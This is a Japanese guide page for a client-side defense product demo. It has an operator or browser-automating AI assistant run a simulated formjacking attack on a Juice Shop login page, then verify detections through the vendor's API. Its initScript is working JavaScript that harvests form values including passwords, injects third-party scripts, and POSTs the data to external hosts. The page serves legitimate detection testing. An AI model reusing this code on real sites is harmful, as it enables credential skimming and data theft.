Phase 2 では、保護対象アプリケーションに対してシミュレートされた攻撃トラフィックを生成し、CSDがそれを検出したことを確認します。Phase 1 が完了していること（Step 7 のすべてのチェックが PASS であること）が前提条件です。

## Step 8: 攻撃シミュレーション

<Aside type="note">
このステップにはブラウザサイドの JavaScript 実行が必要です — `curl` では CSD 検出をトリガーできません。ブラウザ自動化ツール（MCP Chrome DevTools、Playwright、Puppeteer）を持つ AI アシスタントは、以下の **AI 自動実行** シーケンスを使用してこれらのステップを直接実行します。ブラウザ自動化を持たないオペレーターは手動ステップを実行します。
</Aside>

インフラストラクチャが検証済み（Phase 1 Step 7 のすべてのチェックが PASS）であることを確認した後、攻撃シミュレーションスクリプトを実行して CSD 検出を生成します。スクリプトは [検出のトリガー](/csd/trigger-detection/) ガイドおよび [攻撃スクリプトライブラリ](/csd/attack-scripts/) で定義されています。

### AI 自動実行

ブラウザ自動化ツールを持つ AI アシスタントは、攻撃シミュレーションをプログラム的に実行します：

1. **initScript を使用してナビゲーション** — まず `about:blank` にナビゲートしてクリーンなドキュメントコンテキストを確保し（以前のナビゲーションからの古い initScript を回避）、次に `navigate_page` で `http://$F5XC_DOMAINNAME/#/login` にナビゲートします。`initScript` では、zone.js がパッチする前にネイティブの `setInterval`、`clearInterval`、`fetch`、`console.log` を保存し、ログインフォームフィールドをポーリングし、ネイティブの `HTMLInputElement.prototype.value` セッターで認証情報を入力し、Combined Detection Script をインラインで即座に実行します。以下の initScript をそのまま使用してください。
2. **ウェルカムバナーを閉じる** — `press_key` で `Escape` を押してウェルカムバナーを閉じます。以降のアクセスではバナーが表示されないことがあります（Cookie が保持されるため）。Cookie 同意ダイアログも Escape キーで自動的に閉じられます。
3. **完了を待機** — すべての CDN スクリプトのロード/エラーコールバックおよび fetch プロミスの解決が完了するまで 10 秒待機します。
4. **証拠を取得** — `list_console_messages` で `[CSD Demo] Simulation complete` および CDN ロード結果を確認し、`list_network_requests` を `script` および `fetch` タイプでフィルタリングして HTTP ステータスコード（成功の場合は `200`/`201`、保留中のリクエストの場合は `pending`）を確認します。

**Phase 2 initScript（そのまま使用 — 正確に記載通りに使用してください）：**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js の非互換性** — Juice Shop は Angular の zone.js を使用しており、`setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest` などのブラウザ API にパッチを適用します。これにより、MCP の `evaluate_script`、`fill`、`click` ツールが `Cannot read properties of undefined (reading 'call')` エラーで動作しなくなります。代わりに `navigate_page` と `initScript` を使用してください — `initScript` は zone.js がロードされる前に実行されるため、ネイティブ API 参照を保存してポーリングコールバックで使用できます。initScript では、フォームフィールドの入力にネイティブの `HTMLInputElement.prototype.value` セッター（`fill` ではなく）を使用し、検出スクリプトをインラインで実行する（`setTimeout` 経由ではなく、zone.js がページロード後にインターセプトする可能性があるため）必要があります。詳細は [検出のトリガー — AI 自動実行](/csd/trigger-detection/#ai-automated-execution) を参照してください。
</Aside>

<Aside type="note">
**initScript の蓄積** — `initScript` パラメータを持つ各 `navigate_page` 呼び出しは、以降のすべてのドキュメントロード時に実行される永続リストにスクリプトを追加します。古いスクリプトが干渉するのを避けるため、実行間に `about:blank` にナビゲートするか、`new_page` と `isolatedContext` を使用してクリーンなブラウザコンテキストを作成してください。
</Aside>

<Aside type="note">
**initScript でネイティブ `fetch` を保存する** — initScript は zone.js がパッチする前に `window.fetch.bind(window)` を保存します。これにより、zone.js の `Cannot read properties of undefined` エラーなしで fetch 呼び出しが正しく動作します。同じ initScript（ネイティブ `fetch` を保存した状態）が Phase 2 と Phase 3 の両方の攻撃実行に使用されます — CSD 緩和は `fetch()` 呼び出しをインターセプトしないため、ネイティブ参照の保存は緩和の動作に影響しません。
</Aside>

<Aside type="caution">
**一時的なオリジン 404** — Angular アプリケーションへの初回ナビゲーション時に、`polyfills.js` やその他のアプリスクリプトがオリジンサーバーから一時的な HTTP 404 を返すことがあります。これにより Angular のブートストラップが失敗し、ログインフォームのない空白ページが表示されます。404 は一時的なもので、後続のリクエストでは 200 または 304 が返されます。**復旧方法：** `about:blank` にナビゲートし、2 秒待機してからナビゲーションを再試行してください。複数回再試行しても問題が続く場合は、ロードバランサーパス経由でオリジンの正常性を確認してください（`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`）。
</Aside>

### 手動実行

ブラウザ自動化ツールを持たないオペレーターは、以下のステップを手動で実行します：

1. 保護対象アプリケーションのログインページに**ナビゲート**します：`http://xF5XC_DOMAINNAMEx/#/login`
2. **ダミーの認証情報を入力** — Email フィールドに `test@example.com`、Password フィールドに `P@ssword123` を入力します（フォームは送信しないでください）
3. **DevTools を開く** — **F12** を押して **Console** タブに切り替えます
4. **Combined Detection Script を実行** — [検出のトリガー &mdash; Combined Simulation Script の実行](/csd/trigger-detection/#run-the-combined-simulation-script) のスクリプトをコンソールに貼り付けて Enter を押します
5. **コンソール出力を確認** — `[CSD Demo]` のフェーズ出力に、フィールドハーベスティング、4 つの CDN ドメインからのスクリプトインジェクション、および 2 つのエンドポイントへのデータ窃取が表示されていることを確認します

### トリガーされる内容

| シグナル | 動作 | 検出 |
| --- | --- | --- |
| フォームフィールドハーベスティング | メールおよびパスワード入力値を読み取る | 機密フォームフィールドを読み取るスクリプト — High Risk としてフラグ付け |
| スクリプトインジェクション | `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` から 4 つの `&lt;script&gt;` タグを挿入 | 最大 4 つの新しいサードパーティスクリプトドメインを検出（CDN の可用性により変動） |
| データ窃取 | ハーベストしたデータを `fetch` 経由で `www.httpbin.org` および `jsonplaceholder.typicode.com` に送信 | 外部ドメインへのネットワーク呼び出し |

<Aside type="note">
**CDN の可用性は変動します。** すべての実行で 4 つの CDN スクリプトすべてがロードされるわけではありません — ブラウザのリソース制限、ネットワーク状況、または CDN のスロットリングにより、一部が `ERR_INSUFFICIENT_RESOURCES` またはタイムアウトで失敗することがあります。**いずれかの** CDN スクリプトがロードされればシミュレーションは成功です。CSD はスクリプトが正常にロードされたかどうかに関係なくインジェクションの試行を検出します — `&lt;script&gt;` タグの作成自体が検出シグナルです。

深刻なケースでは、`ERR_INSUFFICIENT_RESOURCES` がページレベルの障害にエスカレートすることがあります — ページ全体が空白になり、スクリーンショットがタイムアウトし、`take_snapshot` が失敗します。これは通常、重い initScript を持つ複数のナビゲーションが同じブラウザコンテキストに蓄積された場合に発生します。**復旧方法：** `new_page` と `isolatedContext` を使用して新しいブラウザコンテキストを作成し、`about:blank` → initScript 付き `navigate_page` のシーケンスから再試行してください。これは個別の CDN スクリプトの失敗とは異なり、個別の失敗はシミュレーションの成功に影響しません。
</Aside>

<Aside type="tip">
攻撃シミュレーションを実行した後、以下の決定論的ポーリングループを使用して検出を待機してください：

1. 60 秒ごとに `/detected_domains` をクエリする
2. DET-3 が合格した場合（窃取ドメインが `/detected_domains` に表示された場合）、直ちに Step 9 に進む
3. 10 回のクエリ（10 分）後もまだ空の場合、CSD ステータス（Phase 1 Step 5）および保護対象ドメインの登録（Phase 1 Step 6）を確認する — いずれかが誤って設定されている可能性が高い
4. 30 回のクエリ（30 分）後もまだ空の場合、停止してオペレーターに報告する — Phase 3 に進まないこと

追加のターゲットシミュレーション（個別の攻撃カテゴリ、最大検出ストレステスト）については、[攻撃スクリプトライブラリ](/csd/attack-scripts/) を参照してください。
</Aside>

### 証拠

AI アシスタントは以下を報告する必要があります。AI 自動実行の場合、証拠は `list_console_messages` を介してプログラム的に取得されます（initScript のポーリング関数が結果をコンソールにログ出力します）。手動実行の場合、オペレーターがブラウザコンソールの出力を読み取ります。

| チェック | 期待値 | ステータス |
| --- | --- | --- |
| ログインページがロードされた | `http://$F5XC_DOMAINNAME/#/login` で `200 OK` | PASS / FAIL |
| コンソールスクリプトが実行された | コンソール出力に `[CSD Demo] Simulation complete` | PASS / FAIL |
| フィールドがハーベストされた | コンソール出力でカウント &gt; 0 | PASS |
| スクリプトがインジェクトされた | コンソール出力に 1〜4 つの CDN ドメイン（リソースエラーで失敗するものもある） | いずれかの CDN ドメインが表示されれば PASS |
| 窃取チャネル | コンソール出力に 2 つの fetch POST 試行 | PASS |

<Aside type="tip">
HTTPS LB 証明書が有効（`CertificateValid`）な場合、オプションとして `https://$F5XC_DOMAINNAME/#/login` に対してもシミュレーションを実行できます。これはデモの進行に必須ではありません。
</Aside>

## Step 9: API による検出の検証

CSD API エンドポイントをクエリして、検出が表示されたことを確認します。ポーリングループを使用してください：60 秒ごとに `/detected_domains` をクエリし、DET-3 が合格したらすぐに次に進みます。10 分後に DET-3 が合格しない場合は、CSD 設定を確認してください。30 分後に DET-3 が合格しない場合は、停止してオペレーターに報告してください。これらのエンドポイントは [API リファレンス](/csd/api-reference/) に記載されており、前のステップと同じ認証とネームスペースを使用します。

<Aside type="note">
**エンドポイントの処理順序：** `/detected_domains` が最初に入力され、CSD パイプラインが動作していることの主要な指標となります。`/scripts` および `/formFields` はより遅いバックエンド処理スケジュールで入力されるため、複数のシミュレーション実行後でも 20〜30 分間空のままになることがあります。`/detected_domains` に窃取ドメイン（`www.httpbin.org`、`jsonplaceholder.typicode.com`）が表示されている場合、シミュレーションは正常に検出されたものとして扱い、次に進んでください — 以下の DET-1 チェックはこれを反映しています。
</Aside>

### 検出されたスクリプト

過去 24 時間に検出されたスクリプトをクエリします：

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| フィールド | 期待値 | ステータス |
| --- | --- | --- |
| `total` | &gt; 0（スクリプトが検出された） | &gt; 0 の場合 PASS；0 だが `/detected_domains` に窃取ドメインが表示されている場合 PENDING |
| スクリプト名 | `script_name` に CDN ドメイン（`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`）が含まれる | インジェクトされた CDN ドメインが表示されれば PASS |

### 検出されたドメイン

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| フィールド | 期待値 | ステータス |
| --- | --- | --- |
| `total_domains` | &gt; 0 | &gt; 0 の場合 PASS |
| ドメインリスト | CDN ドメインおよび窃取ドメインが含まれる | 期待されるドメインが表示されれば PASS |

### フォームフィールド

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| フィールド | 期待値 | ステータス |
| --- | --- | --- |
| `total` | &gt; 0 | &gt; 0 の場合 PASS；0 だが DET-3 が合格している場合 PENDING |
| `name` | `email`、`password` が含まれる | 機密フィールドが表示されれば PASS |
| `sensitivity` | メール/パスワードフィールドに対して `Sensitive` | ML が正しく分類していれば PASS |

<Aside type="note">
**フォームフィールドの処理はドメイン検出よりも遅くなります。** `/formFields` エンドポイントは、最初のクエリ時に部分的なメタデータのフィールドを返すことがあります。ML 感度分類（`Sensitive` vs `Not Sensitive`）はバックエンド処理完了後に入力されます — これは最初のシミュレーション実行後 20〜30 分かかることがあります。フィールドが表示されているが分類がない場合は、後でクエリし直してください。DET-3（`/detected_domains`）が主要な合格基準です。
</Aside>

### Phase 2 証拠サマリー

すべての検出クエリ後、最終的な検出ステータスを提示します：

| テスト ID | チェック | ステータス |
| --- | --- | --- |
| DET-1 | スクリプトが検出された（`/scripts` エンドポイント） | &gt; 0 の場合 PASS；空だが DET-3 が合格している場合 PENDING |
| DET-2 | CDN ドメインが検出された | PASS / FAIL |
| DET-3 | 窃取ドメインが検出された（`/detected_domains`） | **主要な指標** — `www.httpbin.org` または `jsonplaceholder.typicode.com` が表示されれば PASS |
| DET-4 | フォームフィールドが検出された（`/formFields` エンドポイント） | &gt; 0 の場合 PASS；空だが DET-3 が合格している場合 PENDING |

<Aside type="note">
**Phase 3 に進むための最小合格基準：** DET-3 が PASS であること（窃取ドメインが `/detected_domains` で確認できること）。DET-1 および DET-4 は初回使用時や新規リビルド後に PENDING と表示されることがあります — これは正常です。DET-3 も 30 分後に FAIL を示す場合は、CSD が有効であること（Phase 1 Step 5）、保護対象ドメインが登録されていること（Phase 1 Step 6）、および CSD JS タグが挿入されていること（Phase 1 Step 7 JS Configuration チェック）を確認してください。
</Aside>

---

**Phase 2 完了。** [Phase 3 — 緩和](/csd/demo/phase-3-mitigate/) に進み、緩和ルールを適用してドメインがブロックされることを確認してください。
